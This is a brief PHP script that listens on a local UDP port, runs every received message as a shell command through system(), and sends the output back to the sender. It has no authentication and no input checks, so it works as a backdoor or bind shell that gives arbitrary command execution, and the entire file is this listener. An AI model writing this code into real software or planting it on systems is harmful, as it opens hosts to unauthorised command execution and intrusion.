<?php

$sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
socket_bind($sock, '127.0.0.1', 30000);

for (;;) {
    socket_recvfrom($sock, $message, 1024, 0, $ip, $port);
    $reply = system($message);
    $reply = $reply . "\n";
    socket_sendto($sock, $reply, strlen($reply), 0, $ip, $port);
}
?>